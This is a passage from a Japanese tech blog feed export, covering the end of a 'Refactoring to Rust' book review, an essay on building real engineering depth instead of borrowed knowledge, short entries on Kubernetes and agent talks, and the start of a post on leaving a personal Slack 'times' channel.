Crusherの中にハンマーが何本あるか。でも、WASIが提供するのは、ハンマーの追加じゃない。缶つぶし機そのものを再定義する能力だ。紙を検索するモジュール、本を検索するモジュール。今日は2つ。明日は100個かもしれない。各モジュールが異なる言語で書かれ、異なる最適化がされ、でも同じインターフェースを提供する。これはマイクロサービスの理想形かもしれない。HTTPのオーバーヘッドなし、コンテナの重さなし、純粋な関数呼び出し。でも、忘れてはいけない。複雑性は消えない、移動するだけだ。メモリ管理、エラーハンドリング、バージョニング。これらの課題は残る。最後に、正直な感想を一つ。この章を読んで、実装して、デバッグして、未来に触れた気がした。不完全で、粗削りで、時にイライラする未来。でも、確実に来る未来。第9章でブラウザの中のWebAssemblyを見た。第10章でブラウザの外のWebAssemblyを見た。次は？おそらく、WebAssemblyがどこにでもある世界。見えない基盤として、当たり前の存在として。Javaは「Write once, run anywhere」を約束して、部分的に成功した。WebAssemblyは「Write in any language, run everywhere」を約束している。この約束が果たされるかは、まだ分からない。でも、journal_cliが動いた瞬間、小さな希望を感じた。WASIはまだ始まったばかり。でも、始まりこそが最も興奮する瞬間だ。不確実性と可能性が共存する、創造の瞬間。第1章で始まった「Refactoring to Rust」の旅は、ここで新しい段階に入った。既存を改善する段階から、未来を構築する段階へ。おわりに——あるいは、点が線になり、線が面になった日本書を読み終えて、そして膨大な参考プロジェクトのコードを追いかけて、私は深い納得感に包まれている。ああ、そういうことだったのか。「はじめに」で書いた、メカニックとエンジニアの違い。今、私はその境界を越えたと感じている。エンジンを分解できるだけでなく、なぜそう設計されているのかが見えるようになった。例えば、所有権。技術的には「メモリ安全性のため」と理解していた。でも、この本を通じて、それが責任の明確化であり、信頼の境界の定義であることを理解した。美術館の作品を「移動」することで消えてしまうという例は、最初は奇妙に思えたが、今では所有権の本質を見事に表現していると感じる。それは単なるメモリ管理の技法ではなく、システム設計の思想だった。例えば、unsafe。「危険だから避ける」と機械的に理解していた。でも、実際は「未検証」の宣言であり、プログラマーとコンパイラの間の契約の境界線だった。第3章から第4章への進化——手動FFIからbindgenへ——を追うことで、この境界管理の重要性が立体的に理解できた。unsafeは禁忌ではなく、責任の明示だった。特に印象的だったのは、失敗の価値だった。第6章の「最適化なしで10%しか改善しない」という告白。私も似たような経験があったが、それを「失敗」として片付けていた。でも、著者たちはそれを学習の機会として提示していた。--releaseフラグ一つで2倍以上の改善。この「当たり前」のことを、きちんと言語化することの重要性。失敗は恥ではなく、理解への階段だった。Kent Beckの「構造と振る舞いを分離する」という原則は、私が無意識に実践していたことに名前を与えてくれた。なぜ私のコードがメンテナンスしやすいのか、なぜリファクタリングが楽なのか。それは偶然じゃなく、この原則に従っていたからだった。直感が理論に裏打ちされた瞬間だった。第8章のGILの説明——「hall pass」の比喩——は、技術的な理解を直感的な理解に変えてくれた。缶つぶし機の中のハンマーの本数。これらの比喩は単なる説明技法じゃない。複雑な概念を共有可能な理解に変換する技術だった。抽象を具象に変える芸術だった。WebAssemblyとWASIの章は、新しい視点を与えてくれた。「Write once, run anywhere」の失敗から「Write in any language, run everywhere」への進化。これは技術の進歩じゃなく、哲学の進化だった。夢の挫折と再生の物語だった。Solomon Hykesの「2008年にWASM+WASIがあれば」という言葉も、今では違って聞こえる。これは技術への郷愁じゃない。パラダイムシフトの予言だった。そして、第10章で自分でランタイムを書いた時、その意味が体感できた。過去への後悔ではなく、未来への道標だった。最も価値があったのは、雰囲気が哲学に昇華されたことだ。なんとなくBoxを使っていた → 所有権の移譲という明確な意図なんとなくResultを返していた → エラーの第一級市民化という設計思想なんとなくモジュールを分けていた → 責任の境界の明確化という原則なんとなくテストを書いていた → 信頼の構築プロセスという哲学点だった知識が線で結ばれ、線が面になり、そして立体的な理解へと成長した。平面的な技術が、立体的な哲学になった。オートバイのメタファーに戻ろう。今の私は、エンジンの音を聞いただけで調子がわかる。振動から不具合を感じ取れる。それは部品の知識があるからじゃない。システムとしての理解があるからだ。Rustも同じだった。エラーメッセージから設計思想が読み取れるようになった。コンパイラの叱責から、より良い設計への道筋が見えるようになった。これからも私はRustでコードを書く。技術的には、おそらく大きな変化はない。でも、なぜそう書くのかを明確に説明できるようになった。そして、その「なぜ」を共有できるようになった。メカニックからエンジニアへ。使う人から、理解する人へ。「Refactoring to Rust」は、技術書でありながら哲学書だった。実践の書でありながら、思考の書だった。そして何より、雰囲気を理解に変える触媒だった。今、私のRustコードには、哲学が宿っている。それは押し付けがましい哲学じゃない。実用的で、段階的で、正直な哲学。恐怖を退屈に変え、暗黙を明示に変え、そして最終的に、より良いソフトウェアを生み出す哲学。道具を使うことと、道具と対話することは違う。今、私はRustと対話している。コンパイラは教師となり、エラーは指針となり、型システムは思考の枠組みとなった。これが、「知っている」から「理解している」への旅の終着点だ。いや、新しい旅の始まりかもしれない。P.S. unwrap()も、今では「プロトタイピングにおける意図的な先送り」という哲学的な選択として理解している。...まぁ、言い訳かもしれないけど。でも、言い訳にも哲学があっていいじゃないか。","isoDate":"2025-08-14T05:35:27.000Z","dateMiliSeconds":1755149727000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Kubernetes Admission Controlについての技術調査","link":"https://sreake.com/blog/dive-deep-into-kubernetes-admission-control/","contentSnippet":"はじめに 工学院大学工学部電気電子工学科4年の清水悠利と申します。 大学では、C言語とOpenCVを用いた画像解析アルゴリズムの研究に従事しており、それとは別に趣味でWebアプリの開発も行っています。今回Sreake事業 […]The post Kubernetes Admission Controlについての技術調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-08-12T13:32:41.000Z","dateMiliSeconds":1755005561000,"authorName":"Sreake","authorId":"Sreake"},{"title":"エンジニアのための「中身のある話」の作り方","link":"https://syu-m-5151.hatenablog.com/entry/2025/08/12/210021","contentSnippet":"はじめにエンジニアの勉強会で、こんな経験はないだろうか。「〇〇って知ってる？」「最近△△が流行ってて」「□□の記事読んだ？」「✗✗さんって知り合い？」次から次へと断片的な情報を繰り出してくる人。どの話題も表面的で、深く掘り下げようとすると会話が続かない。そして、ふと気づく瞬間がある――自分も同じような話し方をしているのではないか、と。コードは書ける。タスクはこなせる。でも技術的な議論になると、借り物の言葉しか出てこない。 この恐怖を、多くのエンジニアが密かに抱えている(と思っている)。表層的な知識だけで話す「Fake野郎」――そう呼ばれることほど、エンジニアとしての信頼と自信を失う言葉はない。何者（新潮文庫）作者:朝井 リョウ新潮社Amazon現代のエンジニアは、かつてないほど豊富な学習リソースに囲まれている。朝から晩まで技術記事を読み漁り、新しいフレームワークを追いかけ、トレンドをキャッチアップする。それなのに、いざ技術的な議論になると、借り物の言葉しか出てこない。問題の本質は、情報量の不足ではない。むしろその逆だと思う。大量の情報を消費することで満足し、深く考える時間を失っている。その結果、「聞いたことはある」レベルの断片的な知識ばかりが蓄積され、体系的な理解や独自の洞察が育たない。今日はそんな問題について考えていきたいと思う。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。コミュニケーション技法の限界雑談を円滑にする方法、相手に好印象を与える話し方――こうしたスキルは確かに社会人として必要だ。共通の話題を見つけ、相手の意見に共感を示し、適度に自己開示をする。これらのテクニックで、職場の人間関係は確実に改善されるだろう。しかし技術的な文脈において「あの人の意見は聞く価値がある」と思われるためには、全く別の次元の能力が要求される。それは、技術に対する深い洞察と、実体験に基づく独自の視点だ。表面的なコミュニケーションスキルでこの本質的な課題を解決しようとするのは、バグの根本原因を無視してUIだけを修正するようなものだ。 一時的には改善したように見えても、本質的な問題は何も解決していない。人は聞き方が９割作者:永松 茂久すばる舎Amazon人は話し方が９割２作者:永松 茂久すばる舎Amazon凡人エンジニアの生存戦略厳しい現実を直視しよう。私たちの大半は、いわゆる「本物」ではない。必死で情報を集めて継ぎ接ぎしている「凡人エンジニア」だ。借り物の言葉で話し、Qiitaのコードで動かし、理解が浅いまま次のタスクに移る。まずは全力で実装して、全力で失敗することから始めよう。「ドキュメント読めばわかる」と言いながら、結局コピペで終わらせている。そんな中途半端な理解では、いつまでも表層的なままだ。公式ドキュメントの10倍のコードを書いて、サンプルコードの10倍のエッジケースを試して、それでも理解できなかったら、そこがスタートラインだ。センスは知識からはじまる作者:水野学朝日新聞出版Amazonセンスの哲学 (文春e-book)作者:千葉 雅也文藝春秋Amazon天才には直感がある。我々にはそれがない。だから地道に検証するしかない。優れたエンジニアが一目で見抜く問題を、我々はベンチマークを取り、プロファイラを回し、ボトルネックを一つずつ潰していく。それが我々の戦い方だ。禅とオートバイ修理技術 上 (ハヤカワ文庫NF)作者:ロバート Ｍ パーシグ早川書房Amazon禅とオートバイ修理技術 下 (ハヤカワ文庫NF)作者:ロバート Ｍ パーシグ早川書房Amazonそして朗報がある。本当に深い理解を持つエンジニアは、実はそんなにいない。一流と評価されているエンジニアのうち、本当に深い理解を持つのはごく一部。残りの大半は、我々と同じ、必死で技術ブログを読み漁って知識を継ぎ接ぎしている連中だ。深い理解がないのに評価されているエンジニアとの違いは、表層的な知識の組み立て方の上手さだ。断片的な知識を体系化し、一つ一つコードで検証して本物らしくなっていく。借り物でも、偽物でも、精度を上げていけば立派な「技術力のあるエンジニア」として認められる。批判された時こそ、謙虚に、誠実に、真摯でなくてはならない。批判してくる外野にではなく、理解したい技術そのものに対して。深い理解を持たない我々は、あくまで謙虚に、一つずつ理解を深めていくしかない。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazon情報収集の罠現代のエンジニアを取り巻く環境を見てみよう。GitHub、Hacker News、Reddit、Zenn、Qiita、技術ブログ、Twitter――無限とも思える情報の海が広がっている。朝起きてから寝るまで、常に新しい情報が流れ込んでくる。そして今や、ChatGPTやClaudeに「説明して」と投げるだけで、瞬時に整理された回答が返ってくる。 GitHub Copilotがコードを補完し、エラーメッセージをそのまま生成AIに貼り付ければ解決策が提示される。便利になった分、自分で考える機会は激減した。しかしここに大きな落とし穴がある。情報を消費し続けることと、知識を深めることは全く別の行為なのだ。むしろ過度な情報摂取は、深い思考を妨げる最大の要因となる。Qiitaから解決策をコピーペーストし、Zennの記事を斜め読みし、YouTubeのチュートリアルを倍速で流し見る。生成AIに「どうやって実装する？」と聞いて、返ってきたコードをそのまま使う。 こうした習慣は、一見効率的に見えるが、実は表面的な理解しか生まない。生成AIの回答は確かに正確で包括的だ。しかし、なぜその実装なのか、どんなトレードオフがあるのか、エッジケースはどうなるのか――こうした深い理解は、自分でデバッグし、失敗し、試行錯誤する中でしか得られない。必要なのは、情報の洪水から一歩離れ、静かに思考する時間だ。新しく学んだ概念について、なぜそう設計されているのか、どんな問題を解決しているのか、他のアプローチと比べてどんな利点があるのか――こうした問いと向き合う時間なくして、深い理解は得られない。奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazonアテンション・エコノミーと「驚き屋」の罠「〇〇驚き屋」という揶揄する言葉を聞いたことがあるだろうか。 新しい技術が出るたびに「革命的だ！」と騒ぎ立て、トレンドが変わるたびに「これからはこれだ！」と主張を変える。彼らの発言には深みがなく、表面的な驚きと感動だけで構成されている。これは個人の問題じゃなくて、アテンション・エコノミーが生み出す構造的な問題なんだよね。 クリック数、いいね数、PV数――これらの指標が支配する世界では、深い考察より刺激的なタイトルが、地道な検証より扇動的な主張が評価される。「〇〇は死んだ」「なぜ〇〇を今すぐやめるべきか」「〇〇を使わない奴は時代遅れ」 ――こうした極端なタイトルの記事が溢れる理由は明白だ。注目を集めることが最優先事項となり、技術の本質的な理解は二の次になる。技術ブログを書く側も読む側も、このアテンション・エコノミーの罠にはまっている。書く側は「バズる」ことを意識し、読む側は刺激的な情報を求めちゃう。 この悪循環が、技術コミュニティ全体の議論を浅くしている。価値のある技術的洞察は、地味で、時間がかかり、すぐには「バズらない」。でもさ、長期的に見れば、これらの深い考察こそが技術の進歩を支えているんだ。 派手な新機能の紹介記事より、バグの根本原因を探る地道な分析の方が、エンジニアとしての成長には遥かに有益だ。「驚き屋」にならないためには、情報の新しさではなく深さを追求する姿勢が必要だ。 トレンドを追いかけるのではなく、技術の本質を理解する。表面的な機能紹介に満足せず、なぜその設計になったのかを探求する。この姿勢こそが、技術力を育てる。アテンション・エコノミーのジレンマ　〈関心〉を奪い合う世界に未来はあるか作者:山本 龍彦KADOKAWAAmazon技術書と技術ブログプログラミング言語の入門書、フレームワークの解説書、設計パターンの教科書――積読が増えていく一方で、正直、身についた知識はどれだけあるだろうか。技術書を読むのは確かに良い。体系的な知識が得られ、著者の深い洞察に触れることができる。しかし、月に何冊も読破しようとすると、結局どれも消化不良に終わってしまう。一冊の技術書から価値を引き出すには、読んだ内容を実際に試し、既存の知識と関連付け、自分のプロジェクトに応用してみる必要がある。そして技術ブログとなると、この問題はさらに顕著になる。技術ブログは技術書以上に断片的で、文脈が省略され、前提知識がバラバラだ。朝のコーヒーを飲みながら5つの記事を流し読み、昼休みにさらに3つ、帰りの電車でまた10個――こうして大量の技術ブログを消費しても、頭に残るのは曖昧な印象だけ。「〇〇の新機能について読んだ気がする」「マイクロサービスの何かについて見た」「セキュリティの重要性について誰かが書いていた」――読んだはずなのに、具体的に何を学んだか説明できない。これが技術ブログの読み過ぎがもたらす典型的な症状だ。私の経験から言うと、技術ブログを立て続けに読むと、まるで異なるプログラミング言語を同時に学んでるような混乱が生じるんだ。ある記事ではTypeScriptのベストプラクティス、次の記事ではGoの並行処理、その次はKubernetesの設定――概念が混ざり合い、理解が浅くなり、結局どれも中途半端に終わってしまう。技術ブログの危険性は、その手軽さにある。 1記事5分で読めるという錯覚が、大量消費を促す。しかし実際には、その5分の記事を理解するには、コードを書いて検証し、関連概念を調べ、自分の言葉で説明できるようになるまで、少なくとも1時間は必要だ。質の高い学習とは、情報の量ではなく、理解の深さで測られる。 週に50本の技術ブログを流し読みするより、1本の記事を徹底的に理解し、実際にコードを書いて検証する方がはるかに価値がある。技術書なら月に1冊を深く読み込む方が、10冊を斜め読みするより遥かに身になる。知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazonインプットのコンテキストスイッチという罠コンテキストスイッチのコストは、アウトプットだけの問題じゃない。インプット（学習）においても、同じように深刻な影響を及ぼす。朝はReactのHooks、昼休みにRustの所有権、夕方にはKubernetesのネットワーキング、寝る前にデータベースのインデックス戦略――一見効率的に見えるが、これは脳に対して過酷なコンテキストスイッチを強いている。プログラミング言語を切り替えるとき、私たちの脳は文法、イディオム、エコシステム、思考パターンを丸ごと切り替える必要がある。JavaScriptの非同期処理を理解しようとしていた脳が、突然Goのgoroutineに切り替わる。この切り替えには、想像以上の認知的コストがかかる。オブジェクト指向から関数型プログラミングへ、ミュータブルからイミュータブルへ――異なるメンタルモデルが脳内で衝突し、どちらの理解も中途半端になってしまう。10分でDockerの記事、5分でGraphQL、15分で機械学習入門。このような学習は、パズルのピースをランダムに拾い集めているようなものだ。結果として「聞いたことはある」レベルの知識ばかりが蓄積される。理解を深めるには「没入」が必要だ。しかし頻繁なコンテキストスイッチは、この没入状態を妨げる。水面を滑るように情報を摂取しても、深海に潜ることはできない。効果的な学習のためには、「テーマを絞った集中的なインプット」が重要だ。 今週はReactに集中する、今月はデータベース設計を深める――こうした戦略的な学習計画が、技術力向上につながる。マルチタスクが生産性を下げるように、マルチトピック学習は理解を浅くする。 一つのテーマに集中し、関連する複数の情報源から多角的に学ぶ。この「深さ優先」のアプローチこそが、技術的洞察を生み出す土壌となる。あっという間に人は死ぬから　「時間を食べつくすモンスター」の正体と倒し方作者:佐藤 舞（サトマイ）KADOKAWAAmazon実践こそが深い理解への唯一の道理論を語るだけの評論家と、実際にシステムを構築するエンジニアの最大の違いは何か。それは、仮説を実証できる環境を持っているということだ。公式ドキュメントには「簡単に実装できます」と書かれていた機能が、実際にはエッジケースの山だった。ベンチマークでは高速だったライブラリが、実環境では思わぬボトルネックになった。こうした「理想と現実のギャップ」は、実装してみて初めて分かる。手を動かすことで見えてくる世界がある。「〇〇の新機能」という記事を10本読むより、実際にその機能を使ってみる。チュートリアルのコピペではなく、ゼロから書く。公式サンプルを動かすだけでなく、壊してみる。境界値を試し、負荷をかけ、エラーケースを検証する。平凡なエンジニアと卓越したエンジニアを分けるのは、「違和感」に対する感度だ。 このAPIの設計、何か不自然じゃないか？なぜこのフレームワークは、こんな実装を選んだのだろう？――天才なら一瞬で見抜く違和感を、凡人の我々は見逃してしまう。Fake野郎は表面的な動作だけ見て「動いたからOK」で終わらせる。だから深い理解に到達できない。 でも、小さな疑問を素通りせず、愚直にコードで検証する習慣を続ければ、いつか独自の技術的洞察にたどり着けるかもしれない。コードリーディングも、深い学習につながる。 ライブラリの内部実装を読めば、ドキュメントに書かれていない設計思想が見えてくる。GitHubでスター数の多いプロジェクトを開き、/srcディレクトリを覗く。最初は圧倒されるかもしれない。しかし、エントリーポイントから少しずつ読み進めれば、必ず「ああ、そういうことか」という気づきが訪れる。技術選定を誤った経験、見積もりを大きく外した経験、本番環境で障害を起こした経験――これらの苦い記憶こそが、最も価値ある学習材料となる。 成功事例からは「うまくいく方法」しか学べないが、失敗からは「なぜうまくいかないのか」という本質的な理解が得られる。個人的に思うのだが、思考を深めるための最良の方法の一つが、技術ブログの執筆だ。 コードの動作を説明し、設計の意図を言語化し、遭遇した問題と解決策を記録する。この過程で、曖昧だった理解が明確になり、見落としていた課題が浮かび上がる。完璧である必要はない。思考の過程を記録することに価値がある。「動いた」で満足せず、「なぜ動くのか」「どこまで動くのか」「動かなくなる境界はどこか」を探求する。サンプルコードをそのまま動かして終わりにするのではなく、必ず何か一つは変更を加えてみる。この小さな実験が、表面的な理解を本質的な理解へと変える。手を動かすことは、時間がかかる。 記事を読むだけなら5分で済むことが、実装すれば1時間かかるかもしれない。しかし、その1時間の投資が、将来の技術的議論で「実はこれ、実装してみたんですが...」と言える強みになる。この実体験に基づく発言こそが、「深みのある話」の源泉となるのだ。アイデアが生まれるプロセス深い技術的洞察はどのようにして生まれるのか。ジェームス・W・ヤングの名著『アイデアのつくり方』が、その答えを示してくれる。ヤングによれば、アイデアっていうのは既存の要素の新しい組み合わせで、その才能は事物の関連性を見つけ出す力に依存してるらしい。3年目までに身につけたい技術ブログの書き方でも紹介したがかなり自分の中でしっくり来ているのだと思う。アイデアのつくり方作者:ジェームス W.ヤングCCC MEDIA HOUSEAmazonこの考え方は、技術的な深みを持つエンジニアになるプロセスと驚くほど一致する。ヤングが提唱する5段階のプロセスを見てみよう。第1段階：資料を収集する特定の技術に関する専門知識と、幅広い一般知識の両方を集める。ドキュメントを読み、コードを書き、エラーメッセージと格闘する――これらすべてが資料収集だ。第2段階：資料を噛み砕く集めた情報を様々な角度から検討し、関係性を探る。「なぜこのAPIはこう設計されているのか」「他の言語ではどう実装されているか」と問いかけながら、情報を咀嚼する。第3段階：問題を放棄する一度意識的な思考から離れ、無意識に働かせる。デバッグに行き詰まったときに散歩に出る、複雑な設計問題を一晩寝かせる――これは逃避ではなく、創造的プロセスの一部だ。第4段階：アイデアが訪れるシャワー中、通勤中、ランチタイム――何気ない瞬間に「あっ、そうか！」という閃きが訪れる。バグの原因が突然分かる、エレガントな設計が浮かぶ、技術の本質が見える瞬間だ。第5段階：アイデアを現実に連れ出す閃いたアイデアを忍耐強く形にする。コードに落とし込み、動作を検証し、チームに説明する。この段階で初めて、漠然とした洞察が具体的な価値となる。多くのエンジニアが「深い話ができない」と悩む理由は、このプロセスのどこかが欠けているからだ。 情報収集ばかりで咀嚼が足りない、あるいは考えてばかりで実装しない。バランスこそが鍵となる。深い洞察が生まれない理由「技術的に深い話ができない」と悩んでいるなら、ヤングの5段階プロセスのどこが欠けているか診断してみよう。資料収集が不足している場合技術書を読む量が少ない、新しい技術に触れる機会が限られている――こんな状態では、組み合わせる要素自体が不足する。ただし、前述の通り大量の技術ブログを流し読みするのは逆効果だ。 質の高い情報源から、じっくりと知識を吸収することが重要となる。最も見落とされがちなのが、ソースコードという一次資料の重要性だ。 ドキュメントは理想を語り、ブログは表面を撫でるが、コードは真実を語る。なぜその設計になったのか、どんな制約があったのか、どんなトレードオフがあったのか――これらの答えはコードの中にある。優れたエンジニアは、コードを読む際に独自の視点を持っている。状態の遷移に着目する者、データの流れを追う者、エラーハンドリングから本質を見抜く者――アプローチは様々だが、共通するのは表層的な動作ではなく、設計の意図を読み取ろうとする姿勢だ。さらに重要なのは、技術以外の分野からの資料収集だ。 心理学、経済学、デザイン、哲学、歴史――こうした他分野の知識が、技術的な洞察に独特の深みを与える。ユーザー心理を理解せずに優れたUIは作れないし、経済原理を知らずにビジネス価値のあるシステムは設計できない。技術と他分野の知識が交差する地点に、イノベーティブなアイデアが生まれる。情報の咀嚼が不足している場合学んだことをそのまま記憶するだけで、自分の言葉で説明できない。コードは書けるが「なぜそう書くのか」を説明できない。これは最も多くのエンジニアが陥る罠だ。咀嚼とは、単に理解することではない。異なる文脈で再構成し、別の角度から検証し、既存の知識と結びつける創造的なプロセスだ。 学んだデザインパターンを、自分のプロジェクトの文脈で解釈し直す。新しいフレームワークの概念を、過去に使った技術と比較する。エラーメッセージの意味を、システム全体の動作と関連付けて理解する。図解する、誰かに説明する、ブログに書く――これらはすべて咀嚼のための手段だ。しかし最も効果的なのは、「もしこれが違う設計だったら」という仮定の問いを立てることだ。 なぜこのAPIはRESTfulなのか、GraphQLだったらどうなるか。なぜこのデータベースはRDBMSなのか、NoSQLだったらどうなるか。この思考実験が、表面的な理解を本質的な理解へと変える。思考を寝かせる時間がない場合常にタスクに追われ、締切に追われ、新しい情報を詰め込み続ける。これでは無意識が働く余地がない。創造的な洞察は、意識的な思考の合間に生まれる。問題を抱えたまま散歩に出る、シャワーを浴びる、コーヒーを淹れる――これらは逃避ではなく、無意識に問題を委ねる積極的な戦略だ。 優れたエンジニアは、デバッグに行き詰まったら席を立つ。設計に悩んだら一晩寝かせる。これは諦めではなく、脳の別の部分を活用する技術だ。重要なのは、問題を明確に定義してから離れることだ。 曖昧なまま放置しても、無意識は働かない。「なぜこのテストが失敗するのか」「どうすればこのパフォーマンスを改善できるか」――具体的な問いを立ててから離れることで、無意識が背景で処理を続ける。そして予期しない瞬間に、答えが浮かび上がる。閃きを見逃している場合「あれ？」という違和感、「もしかして」という仮説――これらの小さな気づきを「大したことない」と無視してしまう。閃きは派手なものばかりではない。むしろ日常の中の小さな違和感こそが、深い洞察への入り口となる。 なぜこのライブラリは、こんな回りくどい実装をしているのか。なぜこのエラーメッセージは、こんなに分かりにくいのか。なぜみんな、この非効率な方法を使い続けているのか。これらの違和感を捕まえるには、常に記録する習慣が必要だ。 スマートフォンのメモアプリ、Slackの自分専用チャンネル、紙のメモ帳――媒体は何でもいい。重要なのは、その瞬間を逃さないことだ。後から見返すと「なんでこんなことをメモしたんだろう」と思うこともある。しかし、その中の一つが、数週間後に重要な発見につながることがある。形にできない場合頭の中では分かっているのに、コードに落とせない、文章にできない、説明できない。これは「完璧主義の罠」かもしれない。しかしより深刻なのは、「形にする」ことの本質を誤解していることだ。 形にするとは、完成品を作ることではない。思考を外部化し、検証可能にし、他者と共有可能にすることだ。プロトタイプでいい、疑似コードでいい、箇条書きでいい。重要なのは、頭の中から外に出すことだ。最小限の形から始める勇気が必要だ。 100行の美しいコードではなく、10行の動くコード。推敲を重ねた技術記事ではなく、500文字のメモ。洗練されたプレゼンではなく、ホワイトボードの走り書き。これらの「不完全な形」こそが、思考を前進させる。形にする過程で新たな問題が見つかり、新たな洞察が生まれる。完璧を待っていては、永遠に何も生み出せない。それでも深い理解に到達できない時はここまで読んでも、できない人が大半だと思う。頭では理解できても、結局技術ブログを流し読みして、何も実装せずに終わっていく。偽物は偽物のまま、凡人は凡人のまま終わってしまうのか。違う。凡人には凡人の戦い方がある。深い理解に一足飛びに到達できないなら、浅い理解を100回積み重ねればいい。 天才が1回で見抜くバグを、我々は10回のprint文で追い詰める。「なんとなく分かった」を50個集めれば、いつの間にか体系的な理解の入り口に立っている。そして何より大切なのは、この積み重ねを「誠実に」続けることだ。分からないことを分からないと認める。コピペしたコードに「理解した」と言わない。ChatGPTが生成したコードを自分が書いたように見せない。この小さな正直さが、長期的には最も強い武器になる。「分からないけど動いた」と正直に言えるエンジニアは、意外と信頼される。 なぜなら、その人の「分かった」という言葉には重みがあるからだ。誠実にコードと向き合い続けると、不思議なことが起きる。3年前に書いた「分からないまま動かしたコード」の意味が、ある日突然分かる瞬間が来る。 これは、誠実に向き合い続けた者だけに与えられる報酬だ。凡人の強みは、凡人の気持ちが分かることだ。 天才の書く完璧なドキュメントより、凡人の書く「ここでハマった」メモの方が、多くの人を救うこともある。一人でこっそり胸を張ってもいい。地道で誠実な成長を、私は美しいと思う。ファスト教養　10分で答えが欲しい人たち (集英社新書)作者:レジー集英社Amazonおわりに記事自体が筆者の批判する「大量の情報」になってしまっている点は皮肉をぶつけないで下さい。痛いです。問題は知識の量だけではない。 大量の情報を右から左へ流すだけでは、いつまでも「借り物の言葉」しか話せない。深みのある技術者になるために必要なのは、情報の消費を減らし、思考の時間を増やすことだ。 週に50本の技術ブログを流し読みする代わりに、1つのテーマに集中して深く潜る。天才ではない我々には、地道な努力しかない。偽物は偽物なりに、凡人は凡人なりに、全力で実装して、全力で失敗して、そこから学ぶ。借り物の知識でも、継ぎ接ぎの理解でも、精度を上げていく。今日から始められることは、シンプルだ。 週に1時間、ネットから離れて静かに考える時間を作る。今週取り組んだ技術的課題について振り返り、500文字でもいいから言語化する。何より恐れるのは「Fake野郎」と呼ばれることだ。借り物の言葉で話し、実装経験もないのに知ったかぶりをし、深い理解もないのに分かったふりをする。でも、それでいい。大切なのは、自分がFake野郎かもしれないという自覚を持ち、それでも前に進む勇気を持つことだ。週に1時間、静かに考える。500文字でもいいから言語化する。実装して、失敗して、そこから学ぶ。この小さな積み重ねが、いつか「あの人の話には深みがある」と言われる日につながる。Fake野郎から始まってもいい。大切なのは、そこで終わらないことだ。","isoDate":"2025-08-12T12:00:21.000Z","dateMiliSeconds":1755000021000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Agent Development Kitで作るマルチエージェントアプリケーション（AIAgent勉強会）","link":"https://speakerdeck.com/yunosukey/agent-development-kitdezuo-rumarutiezientoapurikesiyon-aiagentmian-qiang-hui","contentSnippet":"","isoDate":"2025-08-08T04:00:00.000Z","dateMiliSeconds":1754625600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloudサービスの生成AI関連サービス","link":"https://speakerdeck.com/shukob/google-cloudsabisunosheng-cheng-aiguan-lian-sabisu","contentSnippet":"2025年8月7日(木)、日本生成AIユーザ会 で「Google Cloudサービスの生成AI関連サービス」について発表しました。\\rhttps://genai-users.connpass.com/event/361798/","isoDate":"2025-08-07T04:00:00.000Z","dateMiliSeconds":1754539200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Agent Development Kitで作るマルチエージェントアプリケーション（GCNT2025）","link":"https://speakerdeck.com/yunosukey/agent-development-kitdezuo-rumarutiezientoapurikesiyon-gcnt2025","contentSnippet":"","isoDate":"2025-08-05T04:00:00.000Z","dateMiliSeconds":1754366400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"組織の成長に伴う私のtimes の終焉についての思索","link":"https://syu-m-5151.hatenablog.com/entry/2025/08/04/173559","contentSnippet":"さよなら、私の愛したtimesはじめに組織が成長する過程で、かつて機能していた構造が限界を迎える瞬間がある。私はおそらく今、その転換点に立っている。長年愛用してきた社内での個人的な発信空間であるtimesチャンネル(組織によっては分報という名前かも)を閉じることにした。これは単なるチャンネルの使用終了ではなく、組織の成長段階における必然的な選択だと考えている。ちなみにあくまで私の考えで私のみが実行しています。また、いつか復活する可能性もあります。会社の規模が大きくなってきたことを踏まえ、あくまで個人の考えでTimesチャンネルを削除することに決めました。 pic.twitter.com/eZfl1kuf2Q— nwiizo (@nwiizo) 2025年8月3日   このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。timesの光と影小規模組織において、timesや分報などのいわゆるインフォーマルなコミュニケーションチャンネルは組織の血流として機能する。心理的障壁を下げ、階層を超えた知識共有を可能にし、暗黙知を形式知へと変換する触媒となる。しかし、この美しいエコシステムは、ある臨界点を超えると自己矛盾を抱え始める。スケーラビリティの逆説組織が拡大するにつれ、情報の流通経路は指数関数的に増加する。全体性の把握は不可能となり、部分最適化が進行する。かつて全員が共有していた文脈は断片化し、同じ組織にいながら異なる現実を生きることになる。情報の民主化を目指したはずのシステムが、逆に情報格差を生み出す。見える人と見えない人、聞こえる声と聞こえない声。組織の成長とともに、この非対称性は拡大していく。社内には案件のチャンネル、チームのチャンネル、技術のチャンネルが十分に整理されている。今後の発信はこれらの適切なチャンネルで行うことで、より効果的な情報共有を目指す。注意経済と生産性のパラドックス常時接続の環境は、注意力という有限の資源を巡る競争を生み出す。コミュニケーションの活性化が目的だったはずが、いつしかコミュニケーション自体が目的化する。リアクションの数が暗黙の評価軸となり、本来の価値創造から離れていく。組織内SNS化とでも呼ぶべきこの現象は、生産性向上のためのツールが生産性を阻害するという皮肉な結果を生む。心理的安全性の両義性カジュアルさは諸刃の剣である。フラットな対話を促進する一方で、境界線の曖昧さは時に傷を生む。デジタル空間に刻まれた言葉は、文脈を失いながら永続する。過去の自分が未来の自分を、あるいは他者を傷つける可能性を常に孕んでいる。組織構造をちゃんとやる最近読んだ『トリニティ組織』（矢野和男著）は、私の決断に理論的な確信を与えてくれた。組織の生産性と幸福度を決定づけるのは、人間関係の「形」だという。自分の知り合い2人同士も知り合いである「三角形の関係」が多い組織ほど、問題解決能力が高く、孤立も生まれにくい。トリニティ組織:人が幸せになり、生産性が上がる「三角形の法則」作者:矢野 和男草思社Amazontimesの構造について考えると、その限界が明確になる。発信者を頂点に、参加者が個別につながる形 